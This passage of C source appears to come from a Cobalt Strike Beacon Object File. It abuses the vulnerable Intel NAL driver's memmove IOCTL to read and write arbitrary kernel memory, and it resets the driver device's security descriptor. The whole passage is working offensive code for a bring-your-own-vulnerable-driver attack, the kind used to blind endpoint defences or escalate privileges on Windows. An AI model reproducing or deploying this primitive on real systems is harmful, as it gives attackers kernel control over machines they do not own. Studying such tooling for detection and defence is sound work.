        status = RtlSetDaclSecurityDescriptor(securityDescriptor, TRUE, pAcl, FALSE);
        if (!NT_SUCCESS(status))
            break;

        *SecurityDescriptor = securityDescriptor;
        *DefaultAcl = pAcl;
    } while (FALSE);

    if (!NT_SUCCESS(status)) {
        if (pAcl)
            HeapFree(GetProcessHeap(), 0, pAcl);

        if (securityDescriptor)
            HeapFree(GetProcessHeap(), 0, securityDescriptor);

        *SecurityDescriptor = NULL;
        *DefaultAcl = NULL;
    }
    return status;
}

//NalDrv kernel read/write

NTSTATUS NalCallDriver(_In_ HANDLE DeviceHandle, _In_ PVOID Buffer, _In_ ULONG Size) {
    IO_STATUS_BLOCK sb;
    return NtDeviceIoControlFile(DeviceHandle, NULL, NULL, NULL, &sb, IOCTL_NAL_MANAGE, Buffer, Size, NULL, 0);
}

NTSTATUS NalReadVirtualMemory(_In_ HANDLE DeviceHandle, _In_ ULONG_PTR VirtualAddress, _Out_writes_bytes_(NumberOfBytes) PVOID Buffer, _In_ ULONG NumberOfBytes) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;
    PVOID lockedBuffer = NULL;
    SIZE_T allocSize = NumberOfBytes;

    status = NtAllocateVirtualMemory((HANDLE)-1, &lockedBuffer, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NT_SUCCESS(status) && lockedBuffer) {

        status = NtLockVirtualMemory((HANDLE)-1, &lockedBuffer, (PULONG)&allocSize, VM_LOCK_1);
        if (NT_SUCCESS(status)) {
            cZeroMemory(&request, sizeof(request));
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = VirtualAddress;
            request.DestinationAddress = (ULONG_PTR)lockedBuffer;
            request.Length = NumberOfBytes;

            status = NalCallDriver(DeviceHandle, &request, sizeof(request));
            if (NT_SUCCESS(status)) {
                RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Could not contact device: %lx", status);
            }
            status = NtUnlockVirtualMemory((HANDLE)-1, &lockedBuffer, &allocSize, VM_LOCK_1);
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "Could not unlock virtual memory: %lx", status);
                return status;
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Could not lock virtual memory: %lx", status);
            return status;
        }
        status = NtFreeVirtualMemory((HANDLE)-1, &lockedBuffer, &allocSize, MEM_RELEASE);
        if (!NT_SUCCESS(status))
            BeaconPrintf(CALLBACK_ERROR, "Could not free virtual memory: %lx", status);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory: %lx", status);
    }
    return status;
}

NTSTATUS NalWriteVirtualMemory(_In_ HANDLE DeviceHandle, _In_ ULONG_PTR VirtualAddress, _In_reads_bytes_(NumberOfBytes) PVOID Buffer, _In_ ULONG NumberOfBytes) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;
    SIZE_T allocSize = NumberOfBytes;

    PVOID lockedBuffer = NULL;
    status = NtAllocateVirtualMemory((HANDLE)-1, &lockedBuffer, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NT_SUCCESS(status) && lockedBuffer) {

        RtlCopyMemory(lockedBuffer, Buffer, NumberOfBytes);

        status = NtLockVirtualMemory((HANDLE)-1, &lockedBuffer, (PULONG)&allocSize, VM_LOCK_1);
        if (NT_SUCCESS(status)) {
            cZeroMemory(&request, sizeof(request));
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = (ULONG_PTR)lockedBuffer;
            request.DestinationAddress = VirtualAddress;
            request.Length = NumberOfBytes;

            status = NalCallDriver(DeviceHandle, &request, sizeof(request));
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "Could not contact device: %lx", status);
            }

            status = NtUnlockVirtualMemory((HANDLE)-1, &lockedBuffer, &allocSize, VM_LOCK_1);
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "Could not unlock virtual memory: %lx", status);
                return status;
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Could not lock virtual memory: %lx", status);
            return status;
        }
        status = NtFreeVirtualMemory((HANDLE)-1, &lockedBuffer, &allocSize, MEM_RELEASE);
        if (!NT_SUCCESS(status))
            BeaconPrintf(CALLBACK_ERROR, "Could not free virtual memory: %lx", status);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory: %lx", status);
    }
    return status;
}

NTSTATUS NalPostOpenCallback(PHANDLE DeviceHandle) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PSECURITY_DESCRIPTOR driverSD = NULL;
    PACL defaultAcl = NULL;

    status = CreateSystemAdminAccessSD(&driverSD, &defaultAcl);

    if (NT_SUCCESS(status)) {
        status = NtSetSecurityObject(*DeviceHandle, DACL_SECURITY_INFORMATION, driverSD);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Unable to set driver device security descriptor: %lx", status);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver device security descriptor set successfully");
        }

        if (defaultAcl)
            HeapFree(GetProcessHeap(), 0, defaultAcl);
        HeapFree(GetProcessHeap(), 0, driverSD);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unable to allocate security descriptor: %lx", status);
    }

    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject((HANDLE)-1, *DeviceHandle, (HANDLE)-1, &strHandle, GENERIC_WRITE | GENERIC_READ, 0, 0))) {
        NtClose(*DeviceHandle);
        *DeviceHandle = strHandle;
    }
    return status;
}